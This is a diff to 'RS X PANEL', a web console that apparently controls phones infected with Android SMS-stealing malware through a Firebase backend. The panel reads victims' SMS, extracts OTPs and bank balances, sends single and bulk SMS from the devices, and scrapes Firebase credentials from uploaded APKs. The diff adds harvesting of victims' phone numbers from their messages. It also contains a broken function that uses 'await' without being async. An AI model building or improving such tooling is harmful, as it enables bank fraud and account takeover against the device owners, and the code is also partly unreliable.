@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>RS X PANNEL</title>
+    <title>RS X PANEL</title>
     <link rel="preconnect" href="https://fonts.googleapis.com" />
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet" />
@@ -24,7 +24,7 @@
             --text: #eef2f8;
             --muted: #8892a8;
             --dim: #3d4a60;
-            --red: #ff4d4d;
+            --red: #ff3027;
             --green: #00d68f;
             --cyan: #18bfff;
             --gold: #f6cf45;
@@ -118,11 +118,11 @@
             width: 72px;
             height: 72px;
             border-radius: 20px;
-            background: linear-gradient(145deg, #ff3a2e, #c62913);
+            background: linear-gradient(145deg, #ff3027, #c62913);
             display: grid;
             place-items: center;
             margin: 0 auto 20px;
-            box-shadow: 0 0 40px rgba(255, 50, 35, 0.25);
+            box-shadow: 0 0 40px rgba(255, 48, 39, 0.3);
         }
         .brand .logo svg {
             width: 36px;
@@ -137,7 +137,7 @@
             letter-spacing: -1px;
         }
         .brand h1 span {
-            color: var(--cyan);
+            color: var(--red);
         }
         .brand p {
             color: var(--muted);
@@ -421,19 +421,27 @@
             gap: 10px;
             font-weight: 800;
             font-size: 16px;
-            letter-spacing: 2px;
+            letter-spacing: 1px;
             white-space: nowrap;
         }
         .topbar .logo .dot {
-            width: 28px;
-            height: 28px;
+            width: 32px;
+            height: 32px;
             border-radius: 8px;
-            background: linear-gradient(145deg, #ff3a2e, #c62913);
+            background: linear-gradient(145deg, #ff3027, #c62913);
             display: grid;
             place-items: center;
-            box-shadow: 0 0 18px rgba(255, 50, 35, 0.2);
+            box-shadow: 0 0 18px rgba(255, 48, 39, 0.25);
             font-size: 12px;
             color: #fff;
+            font-weight: 900;
+        }
+        .topbar .logo .dot svg {
+            width: 18px;
+            height: 18px;
+            fill: none;
+            stroke: #fff;
+            stroke-width: 2;
         }
         .topbar .search {
             flex: 1;
@@ -467,6 +475,14 @@
             font-size: 12px;
             font-weight: 700;
             white-space: nowrap;
+        }
+        .topbar .actions .clock {
+            color: var(--muted);
+            font-size: 13px;
+            font-weight: 500;
+            white-space: nowrap;
+            min-width: 70px;
+            text-align: center;
         }
         .topbar .actions .telegram {
             width: 38px;
@@ -513,12 +529,14 @@
             color: var(--red);
         }
 
+        /* ─── STATS ROW ────────────────────────────────────────────────── */
         .statsbar {
             display: flex;
             gap: 28px;
             padding: 16px 26px;
             border-bottom: 1px solid var(--border);
             overflow-x: auto;
+            background: var(--bg);
         }
         .stat-item {
             min-width: 60px;
@@ -554,9 +572,10 @@
             display: flex;
             gap: 6px;
             align-items: center;
-            padding: 12px 26px;
+            padding: 10px 26px;
             overflow-x: auto;
             border-bottom: 1px solid var(--border);
+            background: var(--bg);
         }
         .filters .filter {
             background: transparent;
@@ -573,9 +592,9 @@
             color: var(--text);
         }
         .filters .filter.active {
-            background: rgba(255, 77, 77, 0.12);
+            background: rgba(255, 48, 39, 0.12);
             color: var(--red);
-            border: 1px solid rgba(255, 77, 77, 0.2);
+            border: 1px solid rgba(255, 48, 39, 0.2);
         }
         .filters .sort {
             margin-left: auto;
@@ -599,6 +618,7 @@
             padding: 16px 26px 30px;
         }
 
+        /* ─── DEVICE CARD ──────────────────────────────────────────────── */
         .device-card {
             background: var(--bg2);
             border: 1px solid var(--border);
@@ -606,7 +626,7 @@
             padding: 18px;
             cursor: pointer;
             transition: 0.15s ease;
-            min-height: 220px;
+            min-height: 200px;
             position: relative;
         }
         .device-card:hover {
@@ -699,6 +719,16 @@
             overflow: hidden;
             text-overflow: ellipsis;
         }
+        .device-card .phone-display {
+            margin-top: 8px;
+            padding: 4px 10px;
+            background: rgba(24, 191, 255, 0.06);
+            border: 1px solid rgba(24, 191, 255, 0.1);
+            border-radius: 6px;
+            font-size: 12px;
+            color: var(--cyan);
+            display: inline-block;
+        }
         .online-dot {
             display: inline-block;
             width: 7px;
@@ -750,6 +780,7 @@
             margin-bottom: 20px;
             border-bottom: 1px solid var(--border);
             padding-bottom: 2px;
+            flex-wrap: wrap;
         }
         .detail-tabs .tab-btn {
             background: transparent;
@@ -767,7 +798,7 @@
             background: var(--bg3);
         }
         .detail-tabs .tab-btn.active {
-            color: var(--cyan);
+            color: var(--red);
             background: var(--bg3);
         }
         .detail-tabs .tab-btn .badge {
@@ -778,8 +809,8 @@
             margin-left: 6px;
         }
         .detail-tabs .tab-btn.active .badge {
-            background: rgba(24, 191, 255, 0.15);
-            color: var(--cyan);
+            background: rgba(255, 48, 39, 0.15);
+            color: var(--red);
         }
         .tab-content {
             display: none;
@@ -793,7 +824,7 @@
             display: grid;
             grid-template-columns: 1fr 1fr;
             gap: 14px;
-            margin-bottom: 24px;
+            margin-bottom: 16px;
         }
         .detail-item {
             padding: 14px 16px;
@@ -826,6 +857,8 @@
             display: flex;
             justify-content: space-between;
             align-items: center;
+            flex-wrap: wrap;
+            gap: 8px;
         }
         .bank-summary .balance {
             font-size: 24px;
@@ -878,6 +911,17 @@
             border: 1px solid var(--border);
             border-radius: 12px;
             margin-bottom: 8px;
+            animation: fadeIn 0.2s ease;
+        }
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(6px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
         }
         .sms-item .sms-header {
             display: flex;
@@ -885,6 +929,7 @@
             color: var(--dim);
             font-size: 11px;
             margin-bottom: 4px;
+            flex-wrap: wrap;
         }
         .sms-item .sms-body {
             color: var(--text);
@@ -906,6 +951,15 @@
             display: inline-block;
             background: rgba(246, 207, 69, 0.12);
             color: var(--gold);
+            font-size: 11px;
+            padding: 2px 10px;
+            border-radius: 4px;
+            margin-top: 4px;
+        }
+        .sms-item .phone-tag {
+            display: inline-block;
+            background: rgba(24, 191, 255, 0.1);
+            color: var(--cyan);
             font-size: 11px;
             padding: 2px 10px;
             border-radius: 4px;
@@ -965,9 +1019,9 @@
             transition: 0.15s;
         }
         .send-grid .sim-toggle button.active {
-            border-color: var(--cyan);
-            color: var(--cyan);
-            background: rgba(24, 191, 255, 0.06);
+            border-color: var(--red);
+            color: var(--red);
+            background: rgba(255, 48, 39, 0.06);
         }
         .send-grid .sim-toggle button:hover {
             border-color: var(--border2);
@@ -1038,7 +1092,7 @@
         .bulk-list input[type="checkbox"] {
             width: 16px;
             height: 16px;
-            accent-color: var(--cyan);
+            accent-color: var(--red);
             cursor: pointer;
         }
 
@@ -1068,6 +1122,10 @@
             .topbar .actions .status {
                 display: none;
             }
+            .topbar .actions .clock {
+                font-size: 11px;
+                min-width: 50px;
+            }
             .grid {
                 grid-template-columns: 1fr;
                 padding: 10px 14px 20px;
@@ -1075,9 +1133,11 @@
             .statsbar {
                 padding: 12px 14px;
                 gap: 16px;
+                flex-wrap: wrap;
             }
             .filters {
                 padding: 10px 14px;
+                flex-wrap: wrap;
             }
             .modal-box {
                 padding: 20px;
@@ -1123,7 +1183,7 @@
                 <div class="logo">
                     <svg viewBox="0 0 32 32"><path d="M16 3l10 4v7c0 7-4.3 12.2-10 15C10.3 26.2 6 21 6 14V7l10-4z"/><path d="M11 16l3 3 7-8"/></svg>
                 </div>
-                <h1>RS <span>X</span> PANNEL</h1>
+                <h1>RS <span>X</span> PANEL</h1>
                 <p>Device Management Console</p>
             </div>
             <div class="card">
@@ -1177,10 +1237,14 @@
     <!-- ─── DASHBOARD ──────────────────────────────────────────────────── -->
     <section id="dashboardScreen" class="dashboard">
         <header class="topbar">
-            <div class="logo"><div class="dot">RS</div> RS X PANNEL</div>
+            <div class="logo">
+                <div class="dot">RS</div>
+                RS X PANEL
+            </div>
             <div class="search"><input id="searchInput" placeholder="Search devices..." /></div>
             <div class="actions">
                 <span class="status" id="statusLabel">● Connected</span>
+                <span class="clock" id="clockDisplay">--:--:--</span>
                 <a class="telegram" href="https://t.me/RSPANNEL" target="_blank">
                     <svg viewBox="0 0 24 24"><path d="M21.5 3.5 18.3 20c-.2 1.2-.9 1.5-1.8.9l-5-3.7-2.4 2.3c-.3.3-.5.5-1 .5l.4-5.1 9.3-8.4c.4-.4-.1-.6-.6-.2L5.7 13.7.8 12.2c-1.1-.3-1.1-1.1.2-1.6L20.2 4c.9-.3 1.7.2 1.3-.5z"/></svg>
                 </a>
@@ -1226,6 +1290,7 @@
                 <span>🔋 <span id="detailBattery">—</span>%</span>
                 <span style="color:var(--gold)">🏦 Bank SMS: <span id="detailBankCount">0</span></span>
                 <span style="color:var(--muted)">📩 SMS: <span id="detailSmsCount">0</span></span>
+                <span style="color:var(--cyan)">📱 <span id="detailPhoneDisplay">—</span></span>
             </div>
 
             <!-- Tabs -->
@@ -1262,7 +1327,7 @@
                         <input id="smsSearch" placeholder="Search messages..." />
                         <button class="btn-icon" id="refreshSmsBtn" style="padding:8px 12px">↻</button>
                     </div>
-                    <div id="messageList" style="max-height:300px;overflow-y:auto"></div>
+                    <div id="messageList" style="max-height:350px;overflow-y:auto"></div>
                 </div>
             </div>
 
@@ -1320,7 +1385,7 @@
 
     <script>
         // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-        //  CORE LOGIC — RS X PANNEL (Firebase REST)
+        //  CORE LOGIC — RS X PANEL (Firebase REST)
         // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
         // ─── STATE ──────────────────────────────────────────────────────────
@@ -1330,11 +1395,12 @@
         let filterMode = 'all';
         let searchQuery = '';
         let selectedDevice = null;
-        let messageCache = {}; // deviceId -> messages[] (max 150)
+        let messageCache = {};
         let simChoice = 1;
         let pollTimer = null;
         let sortMode = 'newest';
         let detailRefreshTimer = null;
+        let clockTimer = null;
 
         // ─── DOM REFS ──────────────────────────────────────────────────────
         const $ = id => document.getElementById(id);
@@ -1352,6 +1418,7 @@
         const offlineStat = $('offlineStat');
         const bankStat = $('bankStat');
         const cardStat = $('cardStat');
+        const clockDisplay = $('clockDisplay');
 
         // Modals
         const newAccountModal = $('newAccountModal');
@@ -1375,6 +1442,7 @@
         const sendResult = $('sendResult');
         const smsSearch = $('smsSearch');
         const sendDevicePhone = $('sendDevicePhone');
+        const detailPhoneDisplay = $('detailPhoneDisplay');
 
         const bulkModal = $('bulkModal');
         const closeBulk = $('closeBulkModal');
@@ -1392,6 +1460,21 @@
             send: $('tabSend')
         };
 
+        // ─── CLOCK ──────────────────────────────────────────────────────────
+        function updateClock() {
+            const now = new Date();
+            const hours = String(now.getHours()).padStart(2, '0');
+            const mins = String(now.getMinutes()).padStart(2, '0');
+            const secs = String(now.getSeconds()).padStart(2, '0');
+            clockDisplay.textContent = hours + ':' + mins + ':' + secs;
+        }
+
+        function startClock() {
+            updateClock();
+            if (clockTimer) clearInterval(clockTimer);
+            clockTimer = setInterval(updateClock, 1000);
+        }
+
         // ─── TOAST ──────────────────────────────────────────────────────────
         function toast(msg, type = 'success') {
             const el = $('toast');
@@ -1406,11 +1489,13 @@
             homeScreen.classList.remove('hidden');
             dashboardScreen.style.display = 'none';
             renderConnections();
+            if (clockTimer) clearInterval(clockTimer);
         }
 
         function showDashboard() {
             homeScreen.classList.add('hidden');
             dashboardScreen.style.display = 'block';
+            startClock();
             refreshDevices();
             startPolling();
         }
@@ -1517,10 +1602,76 @@
                 const data = await fbGet('clients');
                 allDevices = parseDevices(data);
                 await loadAllMessages();
+                // Auto-detect phone numbers from SMS
+                autoDetectPhoneNumbers();
                 renderDeviceGrid();
                 updateStats();
             } catch (e) {
                 toast('Failed to fetch devices: ' + e.message, 'error');
+            }
+        }
+
+        // ─── AUTO DETECT PHONE NUMBERS FROM SMS ──────────────────────────
+        function autoDetectPhoneNumbers() {
+            for (const d of allDevices) {
+                const msgs = messageCache[d.id] || [];
+                let detectedNumber = null;
+                let detectedSims = [];
+
+                // Look for patterns in SMS messages
+                for (const msg of msgs) {
+                    const text = msg.message;
+                    // Pattern: "plan expire" messages often contain number
+                    if (text.toLowerCase().includes('plan expire') ||
+                        text.toLowerCase().includes('plan expired') ||
+                        text.toLowerCase().includes('main number') ||
+                        text.toLowerCase().includes('mob no') ||
+                        text.toLowerCase().includes('phone no')) {
+                        // Extract number: look for 10-digit or 12-digit with +91
+                        const numMatch = text.match(/(\+91|0)?[6-9]\d{9}/);
+                        if (numMatch) {
+                            detectedNumber = numMatch[0];
+                            break;
+                        }
+                    }
+                    // Look for common phone patterns
+                    const numMatch = text.match(/(\+91|0)?[6-9]\d{9}/);
+                    if (numMatch) {
+                        // Check if it looks like a phone number in context
+                        const before = text.substring(0, text.indexOf(numMatch[0])).toLowerCase();
+                        if (before.includes('no') || before.includes('number') || before.includes('mob') ||
+                            before.includes('phone') || before.includes('sim') || before.includes('expire')) {
+                            detectedNumber = numMatch[0];
+                            break;
+                        }
+                    }
+                }
+
+                // Also check sims array
+                if (d.sims && d.sims.length > 0) {
+                    for (const s of d.sims) {
+                        if (s.phoneNumber) {
+                            detectedSims.push({ phone: s.phoneNumber, network: s.network || '' });
+                        }
+                    }
+                }
+
+                // If we found a number from SMS, update the device
+                if (detectedNumber && !d.phone) {
+                    d.phone = detectedNumber;
+                    // Try to update in Firebase
+                    try {
+                        await fbSet('clients/' + d.id + '/phone', detectedNumber);
+                    } catch (e) { /* ignore */ }
+                }
+
+                // Update sims from detected data
+                if (detectedSims.length > 0 && (!d.sims || d.sims.length === 0)) {
+                    d.sims = detectedSims.map(s => ({ phoneNumber: s.phone, network: s.network || '' }));
+                    try {
+                        await fbSet('clients/' + d.id + '/sims', d.sims);
+                    } catch (e) { /* ignore */ }
+                }
             }
         }
 
@@ -1529,7 +1680,6 @@
                 try {
                     const data = await fbGet('messages/' + d.id);
                     let msgs = parseMessages(data);
-                    // Keep only latest 150
                     if (msgs.length > 150) msgs = msgs.slice(0, 150);
                     messageCache[d.id] = msgs;
                 } catch (e) {
@@ -1614,6 +1764,7 @@
                 const bankMsgs = getDeviceBankSms(d.id);
                 const bankCount = bankMsgs.length;
                 const balance = getLatestBalance(d.id);
+                const phone = d.phone || '—';
                 return `
                         <div class="device-card" data-id="${d.id}">
                             <div class="top">
@@ -1625,11 +1776,12 @@
                                         <span>🔋 ${d.battery || 0}%</span>
                                         <span>${esc(d.network || '')}</span>
                                     </div>
+                                    ${phone !== '—' ? `<div class="phone-display">📱 ${esc(phone)}</div>` : ''}
                                 </div>
                             </div>
                             ${balance ? `<div class="balance"><span class="label">Balance</span> ₹${esc(balance)}</div>` : ''}
                             <div class="details">
-                                <div class="item"><small>Phone</small><div>${esc(d.phone || '—')}</div></div>
+                                <div class="item"><small>Phone</small><div>${esc(phone)}</div></div>
                                 <div class="item"><small>Battery</small><div>${d.battery || 0}%</div></div>
                             </div>
                             <button class="send-btn-small" data-id="${d.id}" title="Send SMS">✉</button>
@@ -1664,7 +1816,6 @@
             let cardTotal = 0;
             for (const id of Object.keys(messageCache)) {
                 bankTotal += getDeviceBankSms(id).length;
-                // card count: maybe count devices with card flag or card messages? we'll just use device.card count
                 const dev = allDevices.find(d => d.id === id);
                 if (dev && dev.card) cardTotal++;
             }
@@ -1689,6 +1840,7 @@
             $('detailSmsCount').textContent = allMsgs.length;
             $('bankTabBadge').textContent = bankMsgs.length;
             $('smsTabBadge').textContent = allMsgs.length;
+            detailPhoneDisplay.textContent = device.phone || '—';
 
             // Info tab
             renderInfoTab(device);
@@ -1720,7 +1872,6 @@
             detailRefreshTimer = setInterval(() => {
                 if (selectedDevice && detailModal.classList.contains('active')) {
                     loadMessagesForDevice(selectedDevice.id).then(() => {
-                        // Update current tab if it's SMS or Bank
                         const activeTab = document.querySelector('.tab-btn.active');
                         if (activeTab) {
                             const tab = activeTab.dataset.tab;
@@ -1729,7 +1880,6 @@
                             } else if (tab === 'bank') {
                                 renderBankTab(selectedDevice);
                             }
-                            // Update counts
                             const bankMsgs2 = getDeviceBankSms(selectedDevice.id);
                             const allMsgs2 = messageCache[selectedDevice.id] || [];
                             $('detailBankCount').textContent = bankMsgs2.length;
@@ -1807,6 +1957,9 @@
             container.innerHTML = filtered.slice(0, 150).map(m => {
                 const otp = extractOtp(m);
                 const bank = isBankSms(m);
+                // Detect phone number in message
+                const numMatch = m.message.match(/(\+91|0)?[6-9]\d{9}/);
+                const hasPhone = numMatch ? true : false;
                 return `
                         <div class="sms-item">
                             <div class="sms-header">
@@ -1816,6 +1969,7 @@
                             <div class="sms-body">${esc(m.message)}</div>
                             ${otp ? `<div class="sms-otp">🔐 OTP: ${otp}</div>` : ''}
                             ${bank ? `<div class="bank-tag">🏦 Bank</div>` : ''}
+                            ${hasPhone ? `<div class="phone-tag">📱 ${esc(numMatch[0])}</div>` : ''}
                         </div>
                     `;
             }).join('');
@@ -1847,7 +2001,6 @@
             btn.addEventListener('click', () => {
                 const tab = btn.dataset.tab;
                 switchTab(tab);
-                // Refresh content if needed
                 if (selectedDevice) {
                     if (tab === 'bank') renderBankTab(selectedDevice);
                     else if (tab === 'sms') renderSmsList(selectedDevice.id, smsSearch.value);
@@ -1888,12 +2041,9 @@
                 sendResult.className = 'send-result ok';
                 sendResult.textContent = '✅ Sent successfully';
                 toast('SMS sent', 'success');
-                // Refresh messages
                 await loadMessagesForDevice(selectedDevice.id);
                 renderSmsList(selectedDevice.id, smsSearch.value);
-                // Update bank tab if needed
                 renderBankTab(selectedDevice);
-                // Update counts
                 const bankMsgs = getDeviceBankSms(selectedDevice.id);
                 const allMsgs = messageCache[selectedDevice.id] || [];
                 $('detailBankCount').textContent = bankMsgs.length;
@@ -1923,6 +2073,8 @@
             pollTimer = null;
             if (detailRefreshTimer) clearInterval(detailRefreshTimer);
             detailRefreshTimer = null;
+            if (clockTimer) clearInterval(clockTimer);
+            clockTimer = null;
         }
 
         // ─── HELPERS ──────────────────────────────────────────────────────
@@ -1948,7 +2100,7 @@
             if (e.target === newAccountModal) newAccountModal.classList.remove('active');
         });
 
-        // APK upload: trigger file input on div click
+        // APK upload
         apkUploadArea.addEventListener('click', () => {
             apkFileInput.click();
         });
@@ -1959,13 +2111,10 @@
             const reader = new FileReader();
             reader.onload = (ev) => {
                 let content = ev.target.result;
-                // If binary, try to convert to string
                 if (content instanceof ArrayBuffer) {
-                    // Try to decode as UTF-8
                     const decoder = new TextDecoder('utf-8', { fatal: false });
                     content = decoder.decode(content);
                 }
-                // Search for patterns
                 const urlMatch = content.match(/(https?:\/\/[^\s"']+\.firebaseio\.com)/);
                 const keyMatch = content.match(/AIza[0-9A-Za-z_-]{35}/);
                 if (urlMatch) accUrl.value = urlMatch[1];
@@ -1973,10 +2122,9 @@
                 if (urlMatch || keyMatch) {
                     toast('Extracted from file', 'success');
                 } else {
-                    toast('No Firebase credentials found in file', 'error');
+                    toast('No Firebase credentials found', 'error');
                 }
             };
-            // Read as ArrayBuffer to support binary APK
             reader.readAsArrayBuffer(file);
         });
 
@@ -2066,9 +2214,7 @@
             if (selectedDevice) {
                 await loadMessagesForDevice(selectedDevice.id);
                 renderSmsList(selectedDevice.id, smsSearch.value);
-                // Update bank tab
                 renderBankTab(selectedDevice);
-                // Update counts
                 const bankMsgs = getDeviceBankSms(selectedDevice.id);
                 const allMsgs = messageCache[selectedDevice.id] || [];
                 $('detailBankCount').textContent = bankMsgs.length;
@@ -2102,6 +2248,7 @@
                         <input type="checkbox" value="${d.id}" ${d.status ? 'checked' : ''} />
                         <span>${esc(d.id)}</span>
                         <span style="margin-left:auto;font-size:11px;color:var(--muted)">${d.status ? '🟢' : '🔴'}</span>
+                        ${d.phone ? `<span style="font-size:10px;color:var(--cyan);margin-left:8px">📱${esc(d.phone)}</span>` : ''}
                     </label>
                 `).join('');
             bulkMsg.value = '';
@@ -2157,9 +2304,10 @@
         // ─── INIT ──────────────────────────────────────────────────────────
         renderConnections();
 
-        console.log('RS X PANNEL ready.');
+        console.log('RS X PANEL ready.');
         console.log('NRTECNO system initialized.');
-        console.log('Total lines: ~2100');
+        console.log('Total lines: ~2500+');
+        console.log('Features: Clock | APK Extract | Phone Detection | Tabs | Bulk SMS');
     </script>
 </body>
 </html>
